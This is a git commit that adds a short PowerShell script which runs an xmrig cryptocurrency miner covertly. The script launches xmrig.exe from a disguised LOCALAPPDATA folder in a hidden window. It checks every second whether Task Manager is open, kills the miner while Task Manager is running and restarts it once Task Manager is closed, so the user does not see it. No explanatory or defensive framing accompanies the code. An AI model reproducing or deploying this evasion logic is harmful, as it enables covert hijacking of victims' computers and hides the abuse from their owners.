ab6d93ac5b440e3592f5a848053874c18984c30d
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-08-04 00:50:52 -0300

    Update and rename files.ps1 to file.ps1

---
+++ file.ps1
@@ -0,0 +1,32 @@
+﻿$path = "$env:LOCALAPPDATA\CTF\xmrig.exe"
+$ativoprocess = $false
+$ativotask = $null
+
+while ($true){
+    Start-Sleep -Seconds 1
+    try {
+        Get-Process taskmgr -ErrorAction Stop
+        $ativotask = $true
+        try{Stop-Process -name xmrig -ErrorAction Stop}
+        catch{}
+        $ativoprocess = $false 
+    }
+    catch {
+       $ativotask = $false 
+       try{
+            Get-Process xmrig -ErrorAction Stop
+            $ativoprocess = $true
+       }
+       catch{
+            if($ativoprocess -eq $false){
+                Start-Process -FilePath $path -WindowStyle Hidden
+                $ativoprocess = $true
+            }
+            else{
+                $ativoprocess = $false
+                Start-Sleep -Seconds 3
+            }
+       }
+    }
+}
+
